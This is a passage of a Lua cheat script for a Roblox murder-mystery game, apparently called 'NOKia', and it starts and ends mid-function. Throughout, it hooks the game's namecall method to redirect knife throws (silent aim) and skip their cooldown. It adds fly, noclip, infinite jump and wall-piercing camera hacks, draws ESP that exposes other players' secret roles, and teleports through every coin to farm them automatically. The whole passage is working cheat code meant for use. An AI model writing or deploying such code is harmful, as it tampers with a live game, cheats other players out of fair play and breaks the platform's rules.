								d=(d.Magnitude>0.1) and d.Unit or Vector3.new(0,0,-1)
								a[1]=CFrame.new(tp-d*2,tp)
							end
							return oldNamecall(self,table.unpack(a,1,n))
						end
					end
				end
			end
		end
		return oldNamecall(self,...)
	end))
end)

local WeaponService
pcall(function() WeaponService=require(RS:WaitForChild("ClientServices"):WaitForChild("WeaponService")) end)
local function gameAimCFrame()
	if WeaponService then
		local ok,cf=pcall(function() return WeaponService:GetMouseTargetCFrame() end)
		if ok and typeof(cf)=="CFrame" then return cf end
	end
	local ray=aimRay()
	return CFrame.new(ray.Origin+ray.Direction.Unit*300)
end
local function throwKnifeNow(ignoreCooldown)
	local ch=LocalPlayer.Character
	if not ch then return false end
	local knife=ch:FindFirstChild("Knife")
	if not knife then
		local bp=LocalPlayer:FindFirstChild("Backpack")
		local stowed=bp and bp:FindFirstChild("Knife")
		if stowed then
			local hum=ch:FindFirstChildOfClass("Humanoid")
			if hum then pcall(function() hum:EquipTool(stowed) end) end
			knife=ch:FindFirstChild("Knife") or stowed
		end
	end
	if not knife then return false end
	local ev=knife:FindFirstChild("Events")
	local thrown=ev and ev:FindFirstChild("KnifeThrown")
	if not thrown then return false end
	if knife:GetAttribute("Disabled")==true then return false end
	if not ignoreCooldown then
		local cd=1.05*(tonumber(knife:GetAttribute("ThrowSpeed")) or 1)
		if os.clock()-instantFiredAt<cd then return false end
	end
	local target=silentAimPos
	if not target then
		if flags.knifeWalls then
			local snap,far=wallAimPos()
			target=snap or far
		else
			target=gameAimCFrame().Position
		end
	end
	if not target then return false end
	local hrp=getHRP(ch); if not hrp then return false end
	local d=target-hrp.Position
	d=(d.Magnitude>0.1) and d.Unit or Vector3.new(0,0,-1)
	instantFiredAt=os.clock()
	thrown:FireServer(CFrame.new(target-d*2,target),CFrame.new(target))
	return true
end
bind(UserInputService.InputBegan,function(input,gpe)
	if gpe then return end
	if input.UserInputType~=Enum.UserInputType.MouseButton2 then return end
	if flags.instantKnife then throwKnifeNow(false) end
end)
task.spawn(function()
	local ok,act=pcall(function()
		local ic=LocalPlayer:WaitForChild("PlayerGui",10):WaitForChild("InputContext",10)
		return ic:WaitForChild("GameplayContext",10):WaitForChild("Throw",10)
	end)
	if ok and act then
		pcall(function()
			bind(act.Pressed,function()
				if flags.instantKnife then throwKnifeNow(false) end
			end)
		end)
	end
end)

local controlModule
local function getControls()
	if not controlModule then
		pcall(function()
			controlModule=require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls()
		end)
	end
	return controlModule
end
local lastJumpAt=-10
local flyBV,flyBG
local function startFly() local ch=LocalPlayer.Character; local hrp=getHRP(ch); local hum=ch and ch:FindFirstChildOfClass("Humanoid")
	if not (hrp and hum) then return end; hum.PlatformStand=true
	flyBV=create("BodyVelocity",{MaxForce=Vector3.new(1,1,1)*9e9,P=9e4,Velocity=Vector3.zero,Parent=hrp})
	flyBG=create("BodyGyro",{MaxTorque=Vector3.new(1,1,1)*9e9,P=9e4,CFrame=hrp.CFrame,Parent=hrp}) end
local function stopFly() local ch=LocalPlayer.Character; local hum=ch and ch:FindFirstChildOfClass("Humanoid")
	if hum then hum.PlatformStand=false end; if flyBV then flyBV:Destroy();flyBV=nil end; if flyBG then flyBG:Destroy();flyBG=nil end end
bind(RunService.RenderStepped,function()
	if not flags.fly or not flyBV then return end
	local hrp=getHRP(LocalPlayer.Character); if not hrp then return end
	local dir=Vector3.zero; local look,right=Camera.CFrame.LookVector,Camera.CFrame.RightVector
	if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir+=look end
	if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir-=look end
	if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir+=right end
	if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir-=right end
	if UserInputService:IsKeyDown(Enum.KeyCode.Space) or NOKia.mobUp then dir+=Vector3.new(0,1,0) end
	if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or NOKia.mobDown then dir-=Vector3.new(0,1,0) end
	if dir.Magnitude==0 then
		local c=getControls()
		local mv=c and c:GetMoveVector()
		if mv and mv.Magnitude>0 then dir=dir+(look*(-mv.Z))+(right*mv.X) end
	end
	if os.clock()-lastJumpAt<0.25 then dir+=Vector3.new(0,1,0) end
	flyBV.Velocity=(dir.Magnitude>0 and dir.Unit or Vector3.zero)*flags.flySpeed; flyBG.CFrame=Camera.CFrame
end)
local charParts,charPartsFor={},nil
local function refreshCharParts(ch)
	charParts={}
	if not ch then charPartsFor=nil return end
	for _,p in ipairs(ch:GetDescendants()) do
		if p:IsA("BasePart") then charParts[#charParts+1]=p end
	end
	charPartsFor=ch
end
local function getCharParts(ch)
	if ch~=charPartsFor then refreshCharParts(ch) end
	return charParts
end
bind(LocalPlayer.CharacterAdded,function(ch)
	task.defer(function() refreshCharParts(ch) end)
	ch.DescendantAdded:Connect(function(d) if d:IsA("BasePart") then charParts[#charParts+1]=d end end)
end)
if LocalPlayer.Character then
	refreshCharParts(LocalPlayer.Character)
	LocalPlayer.Character.DescendantAdded:Connect(function(d) if d:IsA("BasePart") then charParts[#charParts+1]=d end end)
end
local function uncollide(ch)
	for _,p in ipairs(getCharParts(ch)) do
		if p.Parent and p.CanCollide then p.CanCollide=false; NOKia.unclip[p]=true end
	end
end
function NOKia.recollide(hum)
	if flags.noclip or flinging then return end
	for p in pairs(NOKia.unclip) do
		if p.Parent then p.CanCollide=true end
	end
	table.clear(NOKia.unclip)
	if hum then
		pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
	end
end

bind(RunService.Stepped,function() if not (flags.noclip or flinging) then return end local ch=LocalPlayer.Character; if not ch then return end
	uncollide(ch) end)
bind(UserInputService.JumpRequest,function() lastJumpAt=os.clock() if flags.infJump then local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end end end)

local origMaxZoom=LocalPlayer.CameraMaxZoomDistance
local function setUnlockCam(on) pcall(function() LocalPlayer.CameraMaxZoomDistance=on and 10000 or origMaxZoom end) end
local camCams,origOccUpdate
local function getCams() if not camCams then pcall(function() camCams=require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetCameras() end) end return camCams end
local function setCamThruWalls(on)
	if NOKia.camThru==on then return end
	NOKia.camThru=on
	local cams=getCams(); if not cams then NOKia.camThru=nil return end
	local occ=cams.activeOcclusionModule; if not (occ and occ.Update) then return end
	if on and not occ.__NOKiaHook then
		origOccUpdate=occ.Update; occ.__NOKiaHook=true
		occ.Update=function(_,_,desiredCF,desiredFocus) return desiredCF,desiredFocus end
	elseif (not on) and occ.__NOKiaHook then
		occ.Update=origOccUpdate; occ.__NOKiaHook=false
	end
end
bind(RunService.Heartbeat,function()
	if flags.unlockCam and LocalPlayer.CameraMaxZoomDistance<9999 then setUnlockCam(true) end
	setCamThruWalls(flags.unlockCam and flags.noclip)
end)

local espStore={}
local function clearEsp(plr) local e=espStore[plr]; if not e then return end
	if e.hl then e.hl:Destroy() end; if e.bb then e.bb:Destroy() end; espStore[plr]=nil end
local function espColor(role) if not flags.espRoleTags then return Color3.fromRGB(214,214,220) end
	if role=="Murderer" then return Color3.fromRGB(255,80,80) elseif isGunRole(role) then return Color3.fromRGB(90,150,255) else return Color3.fromRGB(95,225,125) end end
local function tagOf(role) return role=="Murderer" and "[M]" or isGunRole(role) and "[S]" or "[I]" end
local guiRects={}
function NOKia.addRect(o)
	if not (o and o.Visible and o.AbsoluteSize.X>1 and o.AbsoluteSize.Y>1) then return end
	if o:IsA("Frame") and o.BackgroundTransparency>=1 then
		for _,c in ipairs(o:GetChildren()) do
			if c:IsA("GuiObject") then NOKia.addRect(c) end
		end
		return
	end
	local p,s=o.AbsolutePosition,o.AbsoluteSize
	NOKia.guiN=NOKia.guiN+1
	local r=guiRects[NOKia.guiN]
	if r then r[1],r[2],r[3],r[4]=p.X,p.Y,p.X+s.X,p.Y+s.Y
	else guiRects[NOKia.guiN]={p.X,p.Y,p.X+s.X,p.Y+s.Y} end
end
local function refreshGuiRects(force)
	local now=os.clock()
	if not force and now-NOKia.guiT<0.1 then return end
	NOKia.guiT=now
	NOKia.guiN=0
	local sg=Library.ScreenGui
	if not sg then return end
	if Library.Toggled then NOKia.addRect(sg:FindFirstChild("Main")) end
	for _,c in ipairs(sg:GetChildren()) do
		if c:IsA("GuiObject") and c.Name~="Main" then NOKia.addRect(c) end
	end
	if MiniBtnRef and MiniBtnRef.Visible then NOKia.addRect(MiniBtnRef) end
end
local function pointBlocked(x,y)
	for i=1,NOKia.guiN do
		local r=guiRects[i]
		if x>=r[1] and x<=r[3] and y>=r[2] and y<=r[4] then return true end
	end
	return false
end
local function rectBlocked(x1,y1,x2,y2)
	for i=1,NOKia.guiN do
		local r=guiRects[i]
		if x1<=r[3] and x2>=r[1] and y1<=r[4] and y2>=r[2] then return true end
	end
	return false
end
local function ensureEsp(plr) if espStore[plr] then return espStore[plr] end
	local e={}
	e.hl=create("Highlight",{Name=rnd(),FillTransparency=1,OutlineTransparency=0,Enabled=false,DepthMode=Enum.HighlightDepthMode.AlwaysOnTop,Parent=EspGui})
	e.bb=create("BillboardGui",{Name=rnd(),Size=UDim2.fromOffset(170,18),AlwaysOnTop=true,Enabled=false,StudsOffsetWorldSpace=Vector3.new(0,3,0),Parent=EspGui},
	{create("TextLabel",{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Font=Enum.Font.GothamBold,TextSize=12,Text="N",TextStrokeTransparency=.4})})
	espStore[plr]=e; return e end
task.spawn(function() while not Library.Unloaded do
		local anyEsp=flags.espChams or flags.espNames or flags.espRoleTags
		local hrp=getHRP(LocalPlayer.Character)
		for _,plr in ipairs(NOKia.plrs) do if plr~=LocalPlayer then
				local ch=plr.Character
				if anyEsp and alive(plr) and ch and ch:FindFirstChildOfClass("Humanoid") and getHRP(ch) then
					local e=ensureEsp(plr); local role=roleOf(plr); local col=espColor(role); local tHRP=getHRP(ch)
					e.hl.Enabled=flags.espChams
					if flags.espChams then e.hl.Adornee=ch; e.hl.OutlineColor=col; e.hl.FillColor=col; e.hl.FillTransparency=flags.espFill and 0.6 or 1 end
					local parts={}
					if flags.espRoleTags then parts[#parts+1]=tagOf(role) end
					if flags.espNames then local dist=hrp and math.floor((tHRP.Position-hrp.Position).Magnitude) or 0; local rd=roundData(plr); local coins=rd and rd.Coins
						parts[#parts+1]=plr.Name.."  ·  "..dist.."m"..((flags.espRoleTags and coins) and ("  ·  "..coins.."c") or "") end
					if #parts>0 then e.bb.Enabled=true; e.bb.Adornee=tHRP; local lbl=e.bb:FindFirstChildOfClass("TextLabel"); lbl.Text=table.concat(parts,"  "); lbl.TextColor3=col else e.bb.Enabled=false end
				else clearEsp(plr) end
			end end
		task.wait(0.05)
	end end)

local boxStore={}
local function clearBox(plr)
	local b=boxStore[plr]
	if b then for _,l in ipairs(b) do pcall(function() l:Remove() end) end; boxStore[plr]=nil end
end
local function ensureBox(plr)
	local b=boxStore[plr]
	if b then return b end
	b={}
	for i=1,4 do
		b[i]=NOKia.newLine(1)
	end
	boxStore[plr]=b; return b
end
local function charScreenRect(ch)
	local hrp=getHRP(ch); if not hrp then return nil end
	local head=ch:FindFirstChild("Head")
	local px,pz=hrp.Position.X,hrp.Position.Z
	local topY=head and (head.Position.Y+0.9) or (hrp.Position.Y+3.0)
	local botY=hrp.Position.Y-3.0
	if topY<=botY then return nil end
	local t=Camera:WorldToViewportPoint(Vector3.new(px,topY,pz))
	local b=Camera:WorldToViewportPoint(Vector3.new(px,botY,pz))
	if not (t.Z>0 and b.Z>0) then return nil end
	local y1,y2=math.min(t.Y,b.Y),math.max(t.Y,b.Y)
	local h=y2-y1
	if h<1 then return nil end
	local halfW=h*0.29
	local cx=(t.X+b.X)*0.5
	return cx-halfW,y1,cx+halfW,y2
end

local R15Bones={{"Head","UpperTorso"},{"UpperTorso","LowerTorso"},{"UpperTorso","LeftUpperArm"},{"LeftUpperArm","LeftLowerArm"},{"LeftLowerArm","LeftHand"},{"UpperTorso","RightUpperArm"},{"RightUpperArm","RightLowerArm"},{"RightLowerArm","RightHand"},{"LowerTorso","LeftUpperLeg"},{"LeftUpperLeg","LeftLowerLeg"},{"LeftLowerLeg","LeftFoot"},{"LowerTorso","RightUpperLeg"},{"RightUpperLeg","RightLowerLeg"},{"RightLowerLeg","RightFoot"}}
local R6Bones={{"Head","Torso"},{"Torso","Left Arm"},{"Torso","Right Arm"},{"Torso","Left Leg"},{"Torso","Right Leg"}}
local skelStore={}
local function clearSkel(plr) local s=skelStore[plr]; if s then for _,l in ipairs(s.lines) do pcall(function() l:Remove() end) end; skelStore[plr]=nil end end
local function ensureSkel(plr,ch)
	local bones=ch:FindFirstChild("UpperTorso") and R15Bones or R6Bones
	local s=skelStore[plr]
	if s and s.bones==bones and s.char==ch then return s end
	if s then clearSkel(plr) end
	s={bones=bones,lines={},char=ch,parts={}}
	for i=1,#bones do
		s.lines[i]=NOKia.newLine(2)
		s.parts[i]={ch:FindFirstChild(bones[i][1]),ch:FindFirstChild(bones[i][2])}
	end
	skelStore[plr]=s; return s
end
bind(RunService.RenderStepped,function()
	local doBox,doSkel=flags.espBox,flags.espSkeleton
	if not doBox and next(boxStore) then for p in pairs(boxStore) do clearBox(p) end end
	if not doSkel and next(skelStore) then for p in pairs(skelStore) do clearSkel(p) end end
	if not (doBox or doSkel) then return end
	refreshGuiRects()
	for _,plr in ipairs(NOKia.plrs) do if plr~=LocalPlayer then
			local ch=plr.Character
			if ch and ch:FindFirstChildOfClass("Humanoid") and alive(plr) then
				local col=espColor(roleOf(plr))
				if doBox then
					local x1,y1,x2,y2=charScreenRect(ch)
					local b=ensureBox(plr)
					if x1 and not rectBlocked(x1,y1,x2,y2) then
						local tl,tr=Vector2.new(x1,y1),Vector2.new(x2,y1)
						local bl,br=Vector2.new(x1,y2),Vector2.new(x2,y2)
						local pts={{tl,tr},{tr,br},{br,bl},{bl,tl}}
						for i,seg in ipairs(pts) do
							local l=b[i]
							l.From,l.To,l.Color,l.Visible=seg[1],seg[2],col,true
						end
					else
						for _,l in ipairs(b) do l.Visible=false end
					end
				end
				if doSkel then
					local s=ensureSkel(plr,ch)
					local rootHrp=getHRP(ch)
					local vis=false
					if rootHrp then
						local rv=Camera:WorldToViewportPoint(rootHrp.Position)
						local vp=Camera.ViewportSize
						vis=rv.Z>0 and rv.X>-250 and rv.X<vp.X+250 and rv.Y>-250 and rv.Y<vp.Y+250
					end
					if not vis then
						for i=1,#s.lines do local l=s.lines[i]; if l then l.Visible=false end end
					else
						for i=1,#s.bones do local line=s.lines[i]
							local pp=s.parts[i]
							local a,b=pp[1],pp[2]
							if line and a and b and a.Parent and b.Parent then
								local va=Camera:WorldToViewportPoint(a.Position); local vb=Camera:WorldToViewportPoint(b.Position)
								if va.Z>0 and vb.Z>0 and not pointBlocked(va.X,va.Y) and not pointBlocked(vb.X,vb.Y) then
									line.From=Vector2.new(va.X,va.Y); line.To=Vector2.new(vb.X,vb.Y); line.Color=col; line.Visible=true
								else line.Visible=false end
							elseif line then line.Visible=false end
						end
					end
				end
			else
				if doBox then clearBox(plr) end
				if doSkel then clearSkel(plr) end
			end
		end end
end)
bind(Players.PlayerRemoving,function(plr) clearEsp(plr); clearSkel(plr); clearBox(plr) end)

local coinContainerRef
local function getCoinContainer() if coinContainerRef and coinContainerRef.Parent then return coinContainerRef end
	coinContainerRef=workspace:FindFirstChild("CoinContainer",true); return coinContainerRef end
local function coinTaken(d) local c=d:GetAttribute("Collected"); return c==true or c=="true" end
local function freshCoins() local out={}; local c=getCoinContainer()
	if c then for _,d in ipairs(c:GetChildren()) do if d:IsA("BasePart") and (d:GetAttribute("CoinID")~=nil or d.Name=="Coin_Server") and not coinTaken(d) then out[#out+1]=d end end end
	return out end
local coinCache={}
task.spawn(function() while not Library.Unloaded do coinCache=freshCoins(); task.wait(0.2) end end)
local coinEspStore={}
task.spawn(function() while not Library.Unloaded do
		if flags.coinEsp then local seen={}
			for _,coin in ipairs(coinCache) do seen[coin]=true
				if not coinEspStore[coin] then
					local vis=coin:FindFirstChild("CoinVisual"); local ad=(vis and vis:FindFirstChild("MainCoin")) or vis or coin
					coinEspStore[coin]=create("Highlight",{Name=rnd(),Adornee=ad,FillColor=Color3.fromRGB(255,205,55),FillTransparency=0.25,OutlineColor=Color3.fromRGB(255,235,150),OutlineTransparency=0,DepthMode=Enum.HighlightDepthMode.AlwaysOnTop,Parent=EspGui}) end end
			for coin,hl in pairs(coinEspStore) do if not seen[coin] or not coin.Parent then hl:Destroy();coinEspStore[coin]=nil end end
		elseif next(coinEspStore) then for coin,hl in pairs(coinEspStore) do hl:Destroy();coinEspStore[coin]=nil end end
		task.wait(0.15)
	end end)

local GameplayR=RS:WaitForChild("Remotes"):WaitForChild("Gameplay")

for _,rn in ipairs({"TeleportToPart","RoundStart","RoundEndFade","LoadingMap","GameOver","VictoryScreen"}) do
	local r=GameplayR:FindFirstChild(rn)
	if r and r:IsA("RemoteEvent") then bind(r.OnClientEvent,NOKia.markTeleport) end
end
bind(LocalPlayer.CharacterAdded,NOKia.markTeleport)

local CoinCollectedR=GameplayR:FindFirstChild("CoinCollected")
local CoinsStartedR=GameplayR:FindFirstChild("CoinsStarted")
if CoinCollectedR then bind(CoinCollectedR.OnClientEvent,function(_,collected,capacity)
	if type(collected)=="number" then collectedCoinCount=collected end
		if type(collected)=="number" and type(capacity)=="number" and capacity>0 and collected>=capacity then
			if not coinBagFull then
				coinBagFull=true
				if flags.autoCoins or flags.coinBagBeforeRoleBot then notify("Coin bag full, Auto Kill bot activated",4) end
			end
		end
end) end
if CoinsStartedR then bind(CoinsStartedR.OnClientEvent,function() coinBagFull=false; collectedCoinCount=0 end) end

NOKia.farmBlack={}
NOKia.getMurdererRoot=function()
	for _,player in ipairs(NOKia.plrs) do
		if player~=LocalPlayer and alive(player) and roleOf(player)=="Murderer" then
			local root=getHRP(player.Character)
			if root then return root end
		end
	end
end
NOKia.planCoins=function(origin,preferred)
	local available={}
	for _,coin in ipairs(coinCache) do
		if coin.Parent and not coinTaken(coin) and not (NOKia.farmBlack[coin] and os.clock()<NOKia.farmBlack[coin]) then
			local distance=(coin.Position-origin).Magnitude
			if distance<=NOKia.COIN_MAX_DIST then available[#available+1]=coin end
		end
	end
	local plan,current={},origin
	if preferred and preferred.Parent and not coinTaken(preferred) and not (NOKia.farmBlack[preferred] and os.clock()<NOKia.farmBlack[preferred]) then
		plan[1]=preferred; current=preferred.Position
		for index=#available,1,-1 do if available[index]==preferred then table.remove(available,index); break end end
	end
	local murderer=NOKia.getMurdererRoot()
	for _=#plan+1,math.min(10,#available+#plan) do
		local best,bestIndex,bestScore
		for index,coin in ipairs(available) do
			local delta=coin.Position-current
			local score=Vector3.new(delta.X,0,delta.Z).Magnitude+math.abs(delta.Y)*7
			if murderer then
				local danger=(coin.Position-murderer.Position).Magnitude
				if danger<38 then score=score+(38-danger)*5 end
			end
			if not bestScore or score<bestScore then best,bestIndex,bestScore=coin,index,score end
		end
		if not best then break end
		plan[#plan+1]=best
		current=best.Position
		table.remove(available,bestIndex)
	end
	NOKia.coinPlan=plan
	return plan
end
NOKia.computeCoinPath=function(fromPosition,toPosition)
	local path=NOKia.PathfindingService:CreatePath({AgentRadius=2,AgentHeight=5,AgentCanJump=true,AgentCanClimb=true,WaypointSpacing=4})
	local ok=pcall(function() path:ComputeAsync(fromPosition,toPosition) end)
	if ok and path.Status==Enum.PathStatus.Success then return path:GetWaypoints() end
	return nil
end
NOKia.coinNavPosition=function(coin,character)
	local params=RaycastParams.new()
	params.FilterType=Enum.RaycastFilterType.Exclude
	params.FilterDescendantsInstances={character,coin}
	pcall(function() params.RespectCanCollide=true end)
	local hit=workspace:Raycast(coin.Position+Vector3.new(0,5,0),Vector3.new(0,-18,0),params)
	return hit and (hit.Position+Vector3.new(0,2.5,0)) or coin.Position
end
NOKia.coinPathDistance=function(waypoints)
	local total=0
	for index=2,#waypoints do total=total+(waypoints[index].Position-waypoints[index-1].Position).Magnitude end
	return total
end
NOKia.selectReachableCoin=function(origin,character)
	local candidates={}
	local murderer=NOKia.getMurdererRoot()
	for _,coin in ipairs(coinCache) do
		if coin.Parent and not coinTaken(coin) and not (NOKia.farmBlack[coin] and os.clock()<NOKia.farmBlack[coin]) then
			local delta=coin.Position-origin
			if delta.Magnitude<=NOKia.COIN_MAX_DIST then
				local score=Vector3.new(delta.X,0,delta.Z).Magnitude+math.abs(delta.Y)*7
				if murderer then
					local danger=(coin.Position-murderer.Position).Magnitude
					if danger<38 then score=score+(38-danger)*5 end
				end
				candidates[#candidates+1]={coin=coin,score=score}
			end
		end
	end
	table.sort(candidates,function(a,b) return a.score<b.score end)
	local best,bestWaypoints,bestDistance
	for index=1,math.min(12,#candidates) do
		local coin=candidates[index].coin
		local navPosition=NOKia.coinNavPosition(coin,character)
		local waypoints=NOKia.computeCoinPath(origin,navPosition)
		if waypoints and #waypoints>0 then
			local distance=NOKia.coinPathDistance(waypoints)
			if not bestDistance or distance<bestDistance then best,bestWaypoints,bestDistance=coin,waypoints,distance end
		else
			-- Do not immediately retry a coin on another floor with no valid route.
			NOKia.farmBlack[coin]=os.clock()+6
		end
	end
	return best,bestWaypoints,bestDistance
end
NOKia.selectEmergencyCoin=function(origin,murdererPosition)
	local best,bestScore
	for _,coin in ipairs(coinCache) do
		if coin.Parent and not coinTaken(coin) and not (NOKia.farmBlack[coin] and os.clock()<NOKia.farmBlack[coin]) then
			local safety=(coin.Position-murdererPosition).Magnitude
			local travel=(coin.Position-origin).Magnitude
			-- Safety dominates: among safe coins, prefer the one that is less far for us.
			local score=safety*100-travel
			if not bestScore or score>bestScore then best,bestScore=coin,score end
		end
	end
	return best
end
NOKia.touchNearbyCoins=function(root,character,currentTarget)
	local touchedTarget=false
	local params=RaycastParams.new()
	params.FilterType=Enum.RaycastFilterType.Exclude
	params.FilterDescendantsInstances={character}
	pcall(function() params.RespectCanCollide=true end)
	for _,coin in ipairs(coinCache) do
		if coin.Parent and not coinTaken(coin) then
			local delta=coin.Position-root.Position
			if delta.Magnitude<=4.5 then
				local hit=workspace:Raycast(root.Position,delta,params)
				local visible=not hit or hit.Instance==coin or hit.Instance:IsDescendantOf(coin)
				if visible then
					if typeof(firetouchinterest)=="function" then pcall(function() firetouchinterest(root,coin,0); firetouchinterest(root,coin,1) end) end
					NOKia.farmBlack[coin]=os.clock()+1.2
					if coin==currentTarget then touchedTarget=true end
				end
			end
		end
	end
	return touchedTarget
end
NOKia.collectAllMapCoins=function()
	if NOKia.coinBurstBusy then notify("A collection is already in progress."); return end
	local character=LocalPlayer.Character
	local root=getHRP(character)
	if not (character and root and alive(LocalPlayer)) then return end
	local coins={}
	for _,coin in ipairs(freshCoins()) do coins[#coins+1]=coin end
	if #coins==0 then notify("No available coins on this map."); return end
	-- Start with the closest coins so a short or interrupted burst still collects useful ones.
	table.sort(coins,function(a,b) return (a.Position-root.Position).Magnitude<(b.Position-root.Position).Magnitude end)
	NOKia.coinBurstBusy=true
	NOKia.coinBurstCancel=false
	NOKia.markTeleport()
	local home=root.CFrame
	local totalTime=math.clamp(#coins*.018,.20,1.5)
	local perCoin=totalTime/#coins
	notify("Collecting "..tostring(#coins).." map coins...",3)
	task.spawn(function()
		local ok,err=xpcall(function()
			for _,coin in ipairs(coins) do
				if NOKia.coinBurstCancel then break end
				local currentRoot=getHRP(LocalPlayer.Character)
				-- Another player may have taken it since the snapshot: never travel to it then.
				if currentRoot and coin.Parent and not coinTaken(coin) then
					currentRoot.CFrame=CFrame.new(coin.Position)
					currentRoot.AssemblyLinearVelocity=Vector3.zero
					currentRoot.AssemblyAngularVelocity=Vector3.zero
					if typeof(firetouchinterest)=="function" then
						pcall(function() firetouchinterest(currentRoot,coin,0); firetouchinterest(currentRoot,coin,1) end)
					end
				end
				task.wait(perCoin)
			end
		end,debug.traceback)
		local currentRoot=getHRP(LocalPlayer.Character)
		if currentRoot and home then
			currentRoot.CFrame=home
			currentRoot.AssemblyLinearVelocity=Vector3.zero
			currentRoot.AssemblyAngularVelocity=Vector3.zero
		end
		NOKia.markTeleport()
		NOKia.coinBurstBusy=false
		NOKia.coinBurstCancel=false
		NOKia.coinTarget=nil
		NOKia.coinPlan={}
		if not ok then warn("[NOKia] Collect All Map Coins recovered: "..tostring(err)) end
	end)
end
NOKia.inspectWall=function(root,movePosition,character)
	local flat=Vector3.new(movePosition.X-root.Position.X,0,movePosition.Z-root.Position.Z)
	if flat.Magnitude<.1 then return false,false end
	local params=RaycastParams.new()
	params.FilterType=Enum.RaycastFilterType.Exclude
	params.FilterDescendantsInstances={character}
	pcall(function() params.RespectCanCollide=true end)
	local direction=flat.Unit*4.5
	local low=workspace:Raycast(root.Position-Vector3.new(0,1.55,0),direction,params)
	local high=workspace:Raycast(root.Position+Vector3.new(0,1.65,0),direction,params)
	return low~=nil,high~=nil
end
NOKia.pickWallDetour=function(root,movePosition,character)
	local forward=Vector3.new(movePosition.X-root.Position.X,0,movePosition.Z-root.Position.Z)
	if forward.Magnitude<.1 then forward=Vector3.new(root.CFrame.LookVector.X,0,root.CFrame.LookVector.Z) end
	forward=forward.Unit
	local side=Vector3.new(-forward.Z,0,forward.X)
	local params=RaycastParams.new()
	params.FilterType=Enum.RaycastFilterType.Exclude
	params.FilterDescendantsInstances={character}
	pcall(function() params.RespectCanCollide=true end)
	local best,bestClearance
	for _,sign in ipairs({1,-1}) do
		local lateral=side*sign
		local sideHit=workspace:Raycast(root.Position,lateral*9,params)
		local clearance=sideHit and sideHit.Distance or 9
		if clearance>3.5 and (not bestClearance or clearance>bestClearance) then
			bestClearance=clearance
			best=root.Position+lateral*math.min(8,clearance-1)+forward*2
		end
	end
	return best or (root.Position-forward*4+side*6)
end

task.spawn(function()
	local target,targetSince,farming,previousSpeed
	local waypoints,waypointIndex,lastPathAt=nil,1,0
	local lastPlanAt,lastPosition,lastMovedAt=0,nil,0
	local evadeUntil,lastJumpAt,replans,wasEvading=0,0,0,false
	local detourPosition,detourUntil,wallSince,stuckJumps=nil,0,0,0
	local stuckFailures,lastEmergencyTeleport=0,0
	local targetDeadline,targetPathDistance=nil,nil
	local function standDown()
		if farming then
			local character=LocalPlayer.Character
			local humanoid=character and character:FindFirstChildOfClass("Humanoid")
			if humanoid then pcall(function() humanoid.PlatformStand=false; if previousSpeed then humanoid.WalkSpeed=previousSpeed end end) end
			NOKia.recollide(humanoid)
			unstick(character)
		end
		farming=false; previousSpeed=nil; waypoints=nil; waypointIndex=1; replans=0
		detourPosition=nil; detourUntil=0; wallSince=0; stuckJumps=0; stuckFailures=0; targetDeadline=nil; targetPathDistance=nil
	end
	while not Library.Unloaded do
		local active=(flags.autoCoins or roleBotNeedsCoins()) and not NOKia.coinBurstBusy and not murdererSheriffBusy and not sheriffMurdererBusy and not coinBagFull and alive(LocalPlayer) and not NOKia.teleporting()
		local character=LocalPlayer.Character
		local root=getHRP(character)
		local humanoid=character and character:FindFirstChildOfClass("Humanoid")
		if not (active and root and humanoid) then
			standDown(); target=nil; NOKia.coinTarget=nil; NOKia.coinPlan={}; task.wait(.15)
			continue
		end

		if not farming then
			farming=true; previousSpeed=humanoid.WalkSpeed; lastPosition=root.Position; lastMovedAt=os.clock()
		end
		if os.clock()-lastPlanAt>.8 or not target or not target.Parent or coinTaken(target) or NOKia.coinPlan[1]~=target then
			local keepTarget=target and target.Parent and not coinTaken(target) and target or nil
			local selectedPath,selectedDistance
			local nextTarget=keepTarget
			if not nextTarget and flags.autoCoinAvoidWalls then
				nextTarget,selectedPath,selectedDistance=NOKia.selectReachableCoin(root.Position,character)
			end
			local plan
			if nextTarget or not flags.autoCoinAvoidWalls then plan=NOKia.planCoins(root.Position,nextTarget) else plan={}; NOKia.coinPlan=plan end
			lastPlanAt=os.clock()
			nextTarget=nextTarget or plan[1]
			if nextTarget~=target then
				targetSince=os.clock(); waypoints=selectedPath; waypointIndex=2; replans=0
				if selectedPath then lastPathAt=os.clock() end
				targetPathDistance=selectedDistance or (nextTarget and (nextTarget.Position-root.Position).Magnitude) or nil
				local travelTime=targetPathDistance and math.clamp(4+(targetPathDistance/math.max(autoCoinSpeed,8))*1.4,5,10) or 7
				targetDeadline=os.clock()+travelTime
				detourPosition=nil; detourUntil=0; wallSince=0; stuckJumps=0; stuckFailures=0
			end
			target=nextTarget
			NOKia.coinTarget=target
		end
		if not target then task.wait(.2); continue end

		-- Collect every coin we physically pass, even if it spawned after the route was planned.
		if NOKia.touchNearbyCoins(root,character,target) then
			local promoted,promotedWaypoints,promotedDistance,promotedIndex
			for index=2,math.min(4,#NOKia.coinPlan) do
				local candidate=NOKia.coinPlan[index]
				if candidate and candidate.Parent and not coinTaken(candidate) then
					local candidatePath=flags.autoCoinAvoidWalls and NOKia.computeCoinPath(root.Position,NOKia.coinNavPosition(candidate,character)) or nil
					if not flags.autoCoinAvoidWalls then
						promoted,promotedWaypoints,promotedDistance,promotedIndex=candidate,nil,(candidate.Position-root.Position).Magnitude,index
						break
					elseif candidatePath and #candidatePath>0 then
						promoted,promotedWaypoints,promotedDistance,promotedIndex=candidate,candidatePath,NOKia.coinPathDistance(candidatePath),index
						break
					else NOKia.farmBlack[candidate]=os.clock()+6 end
				end
			end
			if promoted then
				for _=1,promotedIndex-1 do table.remove(NOKia.coinPlan,1) end
				target=promoted; NOKia.coinTarget=target; waypoints=promotedWaypoints; waypointIndex=2; lastPathAt=os.clock(); replans=0
				targetSince=os.clock(); targetPathDistance=promotedDistance
